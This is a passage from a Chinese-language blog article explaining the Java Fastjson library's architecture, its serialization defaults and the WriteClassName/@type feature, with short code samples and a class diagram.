<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="keywords" content="Hexo Theme Redefine">
    
    <meta name="author" content="sky123">
    
    <!-- Completely eliminate flash of wrong theme -->
    <script>
        (function() {
            const THEME_KEY = "REDEFINE-THEME-STATUS";
            const DARK = "dark", LIGHT = "light";
            
            // Get preferred theme
            function getTheme() {
                try {
                    const saved = localStorage.getItem(THEME_KEY);
                    if (saved) {
                        const { isDark } = JSON.parse(saved);
                        return isDark ? DARK : LIGHT;
                    }
                } catch (e) {}
                
                return matchMedia("(prefers-color-scheme: dark)").matches ? DARK : LIGHT;
            }
            
            // Apply theme to document
            function applyTheme(theme) {
                const isDark = theme === DARK;
                const root = document.documentElement;
                
                // Set data attribute for CSS variables
                root.setAttribute("data-theme", theme);
                
                // Set classes for compatibility
                root.classList.add(theme);
                root.classList.remove(isDark ? LIGHT : DARK);
                root.style.colorScheme = theme;
            }
            
            // Initial application
            const theme = getTheme();
            applyTheme(theme);
            
            // Listen for system preference changes
            matchMedia("(prefers-color-scheme: dark)").addEventListener("change", ({ matches }) => {
                // Only update if using system preference (no localStorage entry)
                if (!localStorage.getItem(THEME_KEY)) {
                    applyTheme(matches ? DARK : LIGHT);
                }
            });
            
            // Set body classes once DOM is ready
            if (document.readyState !== "loading") {
                document.body.classList.add(theme + "-mode");
            } else {
                document.addEventListener("DOMContentLoaded", () => {
                    document.body.classList.add(theme + "-mode");
                    document.body.classList.remove((theme === DARK ? LIGHT : DARK) + "-mode");
                });
            }
        })();
    </script>
    
    <!-- Critical CSS to prevent flash -->
    <style>
        :root[data-theme="dark"] {
            --background-color: #202124;
            --background-color-transparent: rgba(32, 33, 36, 0.6);
            --second-background-color: #2d2e32;
            --third-background-color: #34353a;
            --third-background-color-transparent: rgba(32, 33, 36, 0.6);
            --primary-color: #0066CC;
            --first-text-color: #ffffff;
            --second-text-color: #eeeeee;
            --third-text-color: #bebec6;
            --fourth-text-color: #999999;
            --default-text-color: #bebec6;
            --invert-text-color: #373D3F;
            --border-color: rgba(255, 255, 255, 0.08);
            --selection-color: #0066CC;
            --shadow-color-1: rgba(255, 255, 255, 0.08);
            --shadow-color-2: rgba(255, 255, 255, 0.05);
        }
        
        :root[data-theme="light"] {
            --background-color: #fff;
            --background-color-transparent: rgba(255, 255, 255, 0.6);
            --second-background-color: #f8f8f8;
            --third-background-color: #f2f2f2;
            --third-background-color-transparent: rgba(241, 241, 241, 0.6);
            --primary-color: #0066CC;
            --first-text-color: #16171a;
            --second-text-color: #2f3037;
            --third-text-color: #5e5e5e;
            --fourth-text-color: #eeeeee;
            --default-text-color: #373D3F;
            --invert-text-color: #bebec6;
            --border-color: rgba(0, 0, 0, 0.08);
            --selection-color: #0066CC;
            --shadow-color-1: rgba(0, 0, 0, 0.08);
            --shadow-color-2: rgba(0, 0, 0, 0.05);
        }
        
        body {
            background-color: var(--background-color);
            color: var(--default-text-color);
        }
        
        /* Apply body classes as soon as DOM is ready */
        :root[data-theme="dark"] body {
            background-color: var(--background-color);
            color: var(--default-text-color);
        }
    </style>
    
    <!-- preconnect -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>

    
    <!--- Seo Part-->
    
    <link rel="canonical" href="https://skyi23.github.io/2025/09/09/java fastjson/"/>
    <meta name="robots" content="index,follow">
    <meta name="googlebot" content="index,follow">
    <meta name="revisit-after" content="1 days">
    
    
    
    
    <!--- Icon Part-->
    <link rel="icon" type="image/png" href="/null" sizes="192x192">
    <link rel="apple-touch-icon" sizes="180x180" href="/null">
    <meta name="theme-color" content="#A31F34">
    <link rel="shortcut icon" href="/null">
    <!--- Page Info-->
    
    <title>
        
            Java FastJson | sky123&#39;s site
        
    </title>

    
<link rel="stylesheet" href="/fonts/Chillax/chillax.css">


    <!--- Inject Part-->
    

    
<link rel="stylesheet" href="/css/style.css">


    
        
<link rel="stylesheet" href="/css/build/tailwind.css">

    

    
<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">

    
<link rel="stylesheet" href="/fonts/Geist/geist.css">

    <!--- Font Part-->
    
    
        <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono&display=swap" rel="stylesheet">
    
    
    
    
    

    <script id="hexo-configurations">
    window.config = {"hostname":"skyi23.github.io","root":"/","language":"en","path":"search.xml"};
    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":false,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":true,"family":"JetBrains Mono","url":"https://fonts.googleapis.com/css2?family=JetBrains+Mono&display=swap"}},"toc":{"enable":true,"max_depth":5,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"side_tools":{"gear_rotation":true,"auto_expand":false},"open_graph":{"enable":false,"image":"/images/redefine-og.webp","description":"Hexo Theme Redefine, Redefine Your Hexo Journey."},"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"sky123's blog","subtitle":{"text":["书有未曾经我读，事无不可对人言"],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"style":"default","links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":true,"version":"11.4.1"}},"version":"2.8.5","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"分类":{"icon":"fa-solid fa-folder","path":"/categories/"},"标签":{"icon":"fa-solid fa-tags","path":"/tags/"},"书签":{"icon":"fa-solid fa-bookmark","path":"/bookmarks/"}},"search":{"enable":true,"preload":true}},"page_templates":{"bookmarks_column":3,"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2024/11/7 00:00:00"};
    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
    window.data = {"masonry":false};
  </script>
    
    <!--- Fontawesome Part-->
    
<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">

    
<link rel="stylesheet" href="/fontawesome/brands.min.css">

    
<link rel="stylesheet" href="/fontawesome/solid.min.css">

    
<link rel="stylesheet" href="/fontawesome/regular.min.css">

    
    
    
    
<!-- hexo injector head_end start --><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.15.3/dist/katex.min.css" integrity="sha256-TThEtR+XalhWKkfF383YLOrI50NGNeIqrzS+q08afrY=" crossorigin="anonymous"><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head>



<body>
	<div class="progress-bar-container">
	
	<span class="scroll-progress-bar"></span>
	

	
	<span class="pjax-progress-bar"></span>
	<!--        <span class="swup-progress-icon">-->
	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
	<!--        </span>-->
	
</div>

<main class="page-container" id="swup">

	

	<div class="main-content-container flex flex-col justify-between min-h-dvh">
		<div class="main-content-header">
			<header class="navbar-container px-6 md:px-12">
    <div class="navbar-content transition-navbar ">
        <div class="left">
            
            <a class="logo-title" href="/">
                
                sky123&#39;s site
                
            </a>
        </div>

        <div class="right">
            <!-- PC -->
            <div class="desktop">
                <ul class="navbar-list">
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/"
                                        >
                                    <i class="fa-regular fa-house fa-fw"></i>
                                    HOME
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/categories/"
                                        >
                                    <i class="fa-solid fa-folder fa-fw"></i>
                                    分类
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/tags/"
                                        >
                                    <i class="fa-solid fa-tags fa-fw"></i>
                                    标签
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/bookmarks/"
                                        >
                                    <i class="fa-solid fa-bookmark fa-fw"></i>
                                    书签
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                    
                        <li class="navbar-item search search-popup-trigger">
                            <i class="fa-solid fa-magnifying-glass"></i>
                        </li>
                    
                </ul>
            </div>
            <!-- Mobile -->
            <div class="mobile">
                
                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
                    </div>
                
                <div class="icon-item navbar-bar">
                    <div class="navbar-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <!-- Mobile sheet -->
    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/"
                        >
                            <span>
                                HOME
                            </span>
                            
                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/categories/"
                        >
                            <span>
                                分类
                            </span>
                            
                                <i class="fa-solid fa-folder fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/tags/"
                        >
                            <span>
                                标签
                            </span>
                            
                                <i class="fa-solid fa-tags fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/bookmarks/"
                        >
                            <span>
                                书签
                            </span>
                            
                                <i class="fa-solid fa-bookmark fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            

            
            
        </ul>

        <div class="statistics flex justify-around my-2.5">
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">13</div>
        <div class="label text-third-text-color text-sm">Tags</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">16</div>
        <div class="label text-third-text-color text-sm">Categories</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">55</div>
        <div class="label text-third-text-color text-sm">Posts</div>
    </a>
</div>
    </div>

    <div class="window-mask"></div>

</header>


		</div>

		<div class="main-content-body transition-fade-up">
			

			<div class="main-content">
				<div class="post-page-container flex relative justify-between box-border w-full h-full">
	<div class="article-content-container">

		<div class="article-title relative w-full">
			
			<div class="w-full flex items-center pt-6 justify-start">
				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">Java FastJson</h1>
			</div>
			
		</div>

		
		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
			<div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
				<img src="/images/icon.jpg">
			</div>
			<div class="info flex flex-col justify-between">
				<div class="author flex items-center">
					<span class="name text-default-text-color text-lg font-semibold">sky123</span>
					
				</div>
				<div class="meta-info">
					<div class="article-meta-info">
    <span class="article-date article-meta-item">
        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
        <span class="desktop">2025-09-09 00:45:24</span>
        <span class="mobile">2025-09-09 00:45:24</span>
        <span class="hover-info">Created</span>
    </span>
    
        <span class="article-date article-meta-item">
            <i class="fa-regular fa-wrench"></i>&nbsp;
            <span class="desktop">2025-09-18 23:01:28</span>
            <span class="mobile">2025-09-18 23:01:28</span>
            <span class="hover-info">Updated</span>
        </span>
    

    
        <span class="article-categories article-meta-item">
            <i class="fa-regular fa-folders"></i>&nbsp;
            <ul>
                
                
                    
                        
                        <li>
                            <a href="/categories/web/">web</a>&nbsp;
                        </li>
                    
                    
                
                    
                        
                            <li>></li>
                        
                        <li>
                            <a href="/categories/web/java-web/">java web</a>&nbsp;
                        </li>
                    
                    
                
            </ul>
        </span>
    
    
        <span class="article-tags article-meta-item">
            <i class="fa-regular fa-tags"></i>&nbsp;
            <ul>
                
                    <li>
                        <a href="/tags/java-web/">java web</a>&nbsp;
                    </li>
                
            </ul>
        </span>
    

    
    
        <span class="article-wordcount article-meta-item">
            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>50k Words</span>
        </span>
    
    
        <span class="article-min2read article-meta-item">
            <i class="fa-regular fa-clock"></i>&nbsp;<span>228 Mins</span>
        </span>
    
    
        <span class="article-pv article-meta-item">
            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
        </span>
    
</div>

				</div>
			</div>
		</div>
		

		


		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
			<p><strong>Fastjson</strong> 是阿里巴巴开源的一个 <strong>Java JSON 处理库</strong>，主要功能是：</p>
<ul>
<li><strong>序列化</strong>：将 Java 对象（POJO）转换为 JSON 字符串</li>
<li><strong>反序列化</strong>：将 JSON 字符串还原为 Java 对象</li>
</ul>
<p>它的核心特点是 <strong>性能高、使用方便</strong>，尤其适合需要处理大量 JSON 数据或对性能要求较高的场景。</p>
<blockquote>
<p><strong>POJO</strong>（Plain Old Java Object，普通的 Java 对象）指的是一种<strong>不依赖特定框架</strong>、<strong>不继承或实现特定库的类</strong>，通常只包含属性字段和对应的 getter&#x2F;setter 方法。</p>
<p>设计原则：</p>
<ul>
<li>不继承特定类（如不强制继承框架基类）</li>
<li>不实现特定接口（除非是 <code>Serializable</code> 这类不影响业务逻辑的接口）</li>
<li>主要作用是作为数据载体，用于封装和传递数据</li>
</ul>
<p>在 Fastjson 中，POJO 是最常见的序列化与反序列化对象类型。</p>
</blockquote>
<p>FastJson 的 Maven 坐标如下：</p>
<div class="code-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>fastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.23<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>FastJson 的整体涉及架构如下：</p>
<pre class="mermaid">classDiagram
direction LR

%% ===== 顶层门面 =====
class JSON {
  +parse(String) Object
  +parseObject(String) JSONObject
  +parseObject(String, Type) Object
  +parseObject(String, Class~T~) T
  +toJSONString(Object) String
}
note for JSON "门面入口<br/>parseObject(String) 会先调 parse(...)（可能触发 @type 的构造/setter 等副作用）<br/>随后 toJSON 成 JSONObject 返回"

%% ===== 解析器 =====
class DefaultJSONParser {
  -config: ParserConfig
  -lexer: JSONLexer
  -context: ParseContext
  -symbolTable: SymbolTable
  +DefaultJSONParser(String, ParserConfig)
  +parse() Object
  +parseObject(Type) Object
  +accept(int) void
}
note for DefaultJSONParser "持有 ParserConfig/JSONLexer/SymbolTable<br/>负责驱动词法器与分派 ObjectDeserializer"

%% ===== 词法层 =====
class JSONLexer {
  <<interface>>
  +token: int
  +nextToken() void
  +stringVal() String
  +intValue() int
  +scanSymbol(SymbolTable) String
  +config(Feature, boolean) void
}
note for JSONLexer "抽象词法接口；scanSymbol 会借助 SymbolTable 做字段名驻留"

class JSONLexerBase {
  +nextToken() void
  +scanSymbol(SymbolTable) String
  +scanString() void
  +config(Feature, boolean) void
}
JSONLexerBase ..|> JSONLexer
note for JSONLexerBase "通用词法实现；支持 Feature 开关（单引号/多余逗号/ISO8601 等）<br/>byte[] 走 bytesValue(Base64) 路径"

class JSONScanner {
  -text: String
}
JSONScanner --|> JSONLexerBase
note for JSONScanner "基于 String 的扫描器"

class JSONReaderScanner {
  -reader: java.io.Reader
  -buf: char[]
}
JSONReaderScanner --|> JSONLexerBase
note for JSONReaderScanner "基于 Reader 的扫描器"

class Feature {
  <<enum>>
  +AllowSingleQuotes
  +AllowArbitraryCommas
  +AllowUnQuotedFieldNames
  +IgnoreNotMatch
  +SupportNonPublicField
  +AllowISO8601DateFormat
  +UseBigDecimal
  +DisableFieldSmartMatch
  +...
}
JSONLexerBase --> Feature : config()
note for Feature "解析特性枚举；按需启停宽松语法/数值/匹配行为等"

%% ===== 符号表 =====
class SymbolTable {
  -symbols: String[]
  -indexMask: int
  +addSymbol(char[], int, int) String
}
JSONLexer --> SymbolTable : scanSymbol()
note for SymbolTable "字段名驻留/复用（减少字符串分配）"

%% ===== 反序列化策略接口与实现 =====
class ObjectDeserializer {
  <<interface>>
  +deserialze~T~(DefaultJSONParser, Type, Object) T
}
note for ObjectDeserializer "策略接口；注意库内方法名是 deserialze（少个 i）<br/>返回泛型 T"

class JavaBeanDeserializer {
  -fieldDeserializers: FieldDeserializer[]
  -sortedFieldDeserializers: FieldDeserializer[]
  -beanInfo: JavaBeanInfo
  -clazz: Class~?~
  +createInstance(DefaultJSONParser, Type) Object
  +parseField(DefaultJSONParser, String, Object) void
  +deserialze(DefaultJSONParser, Type, Object) Object
}
ObjectDeserializer <|.. JavaBeanDeserializer
note for JavaBeanDeserializer "JavaBean 反序列化器：<br/>赋值策略：1 setter 优先；2 无 setter 且 getter 返回可变容器→就地填充；3 开启 SupportNonPublicField→直写字段<br/>字段名匹配：精确→别名→布尔 is 前缀→去下划线/连字符的宽松匹配<br/>byte[] 自动 Base64 解码"

class FieldDeserializer {
  <<abstract>>
  +parseField(DefaultJSONParser, Object, Type, java.util.Map) void
}
JavaBeanDeserializer --> FieldDeserializer : uses *
note for FieldDeserializer "负责单字段的读取与写入（调用 setter / 直写字段）"

class MapDeserializer {
  <<singleton>>
  +instance: MapDeserializer
  +deserialze(DefaultJSONParser, Type, Object) Object
  +createMap(Type) java.util.Map
}
ObjectDeserializer <|.. MapDeserializer
note for MapDeserializer "Map 反序列化；常返回 LinkedHashMap 等实现"

class CollectionDeserializer {
  +deserialze(DefaultJSONParser, Type, Object) Object
  +createCollection(Type) java.util.Collection
}
ObjectDeserializer <|.. CollectionDeserializer
note for CollectionDeserializer "集合反序列化；常返回 ArrayList 等实现"

%% ===== 配置/工厂 =====
class ParserConfig {
  +global: ParserConfig
  -deserializers: IdentityHashMap~Type, ObjectDeserializer~
  -asmFactory: ASMDeserializerFactory
  -safeMode: boolean
  +getDeserializer(Type) ObjectDeserializer
  +createJavaBeanDeserializer(Class, Type) ObjectDeserializer
  +createFieldDeserializer(ParserConfig, Class, FieldInfo) FieldDeserializer
  +checkAutoType(String, Class, int) Class
}
ParserConfig o--> ObjectDeserializer : registry/cache
ParserConfig --> JavaBeanDeserializer : create
ParserConfig --> FieldDeserializer : create
note for ParserConfig "缓存与工厂：getDeserializer / create*<br/>安全：checkAutoType 审核 @type（白/黑名单、safeMode）"

%% ===== 关系（控制流标签） =====
JSON --> DefaultJSONParser : creates/uses
DefaultJSONParser --> JSONLexer : uses
DefaultJSONParser --> ParserConfig : uses
DefaultJSONParser --> ObjectDeserializer : dispatch</pre>

<h1 id="FastJson-特性"><a href="#FastJson-特性" class="headerlink" title="FastJson 特性"></a>FastJson 特性</h1><h2 id="POJO-JSON（序列化）"><a href="#POJO-JSON（序列化）" class="headerlink" title="POJO -&gt; JSON（序列化）"></a>POJO -&gt; JSON（序列化）</h2><h3 id="toJSONString"><a href="#toJSONString" class="headerlink" title="toJSONString"></a>toJSONString</h3><p>FastJson 序列化主要是依靠 <code>com.alibaba.fastjson.JSON#toJSONString</code> 函数进行的，该函主要有下面两种重载：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 将指定对象序列化为等价的 JSON 字符串。</span></span><br><span class="line"><span class="comment"> * 注意：如果对象的某些字段是泛型类型，本方法依然可以正常工作；</span></span><br><span class="line"><span class="comment"> * 但如果对象本身是一个泛型类型，则可能会有问题。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 如果你希望直接把对象写入到 &#123;<span class="doctag">@link</span> Writer&#125; 中，</span></span><br><span class="line"><span class="comment"> * 请使用 &#123;<span class="doctag">@link</span> #writeJSONString(Writer, Object, SerializerFeature[])&#125; 方法。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> object 需要转换为 JSON 字符串的对象</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> &#123;<span class="doctag">@code</span> object&#125; 的 JSON 字符串表示</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">toJSONString</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> toJSONString(object, emptyFilters);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 将指定对象序列化为 JSON 字符串，并支持通过 SerializerFeature 数组自定义序列化特性。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> object   需要转换为 JSON 字符串的对象</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> features 序列化特性，例如 WriteClassName、PrettyFormat 等</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> &#123;<span class="doctag">@code</span> object&#125; 的 JSON 字符串表示</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">toJSONString</span><span class="params">(Object object, SerializerFeature... features)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> toJSONString(object, DEFAULT_GENERATE_FEATURE, features);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h4 id="序列化行为"><a href="#序列化行为" class="headerlink" title="序列化行为"></a>序列化行为</h4><p>其中第个重载函数比第一个函数多了一个 <code>features</code> 参数，该参数类型是 <code>SerializerFeature</code> 枚举。<code>toJSONString</code> 的序列化行为由该枚举控制。</p>
<p>如果用户未显式传参，则会使用 <code>DEFAULT_GENERATE_FEATURE</code>，在 Fastjson 初始化时默认开启了以下四个特性：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 静态初始化代码块，在类加载时执行一次</span></span><br><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">features</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 开启序列化时的一些默认特性（用位运算叠加掩码）</span></span><br><span class="line">    features |= SerializerFeature.QuoteFieldNames.getMask();     <span class="comment">// 输出 JSON 时，字段名使用引号包裹（标准 JSON 要求）</span></span><br><span class="line">    features |= SerializerFeature.SkipTransientField.getMask();  <span class="comment">// 跳过 transient 修饰的字段，不进行序列化</span></span><br><span class="line">    features |= SerializerFeature.WriteEnumUsingName.getMask();  <span class="comment">// 枚举类型使用枚举名输出，而不是 ordinal 整数值</span></span><br><span class="line">    features |= SerializerFeature.SortField.getMask();           <span class="comment">// 对输出的字段名进行排序（保证输出顺序一致）</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 赋值给默认的序列化特性组合</span></span><br><span class="line">    DEFAULT_GENERATE_FEATURE = features;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义一个空的序列化过滤器数组（默认情况下不使用任何过滤器）</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> SerializeFilter[] emptyFilters = <span class="keyword">new</span> <span class="title class_">SerializeFilter</span>[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 保存序列化时的默认特性（由上面静态代码块初始化）</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> DEFAULT_GENERATE_FEATURE;</span><br></pre></td></tr></table></figure></div>

<p>另外常见的 <code>SerializerFeature</code> 特性还有：</p>
<ul>
<li><code>PrettyFormat</code>：美化输出，带缩进换行。</li>
<li><code>WriteMapNullValue</code>：输出值为 null 的字段。</li>
<li><code>WriteNullStringAsEmpty</code> &#x2F; <code>WriteNullListAsEmpty</code>：null 字符串 &#x2F; 集合以 <code>&quot;&quot;</code> 或 <code>[]</code> 输出。</li>
<li><code>DisableCircularReferenceDetect</code>：关闭循环引用检测，提升性能。</li>
<li>**<code>WriteClassName</code>**：序列化时输出 <code>@type</code> 字段，包含类的全限定名。</li>
</ul>
<p>其中 <code>WriteClassName</code> 在安全研究中非常重要。该特性会让 <code>toJSONString</code> 函数在序列化时输出 <code>@type</code> 字段（包含完整类名），用于<strong>保留运行时类型信息</strong>，方便反序列化时还原类属性。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Person</span> <span class="variable">p</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;Lisa&quot;</span>, <span class="number">20</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> JSON.toJSONString(p, SerializerFeature.WriteClassName);</span><br><span class="line"><span class="comment">// 输出：&#123;&quot;@type&quot;:&quot;org.example.Person&quot;,&quot;age&quot;:20,&quot;name&quot;:&quot;Lisa&quot;&#125;</span></span><br></pre></td></tr></table></figure></div>

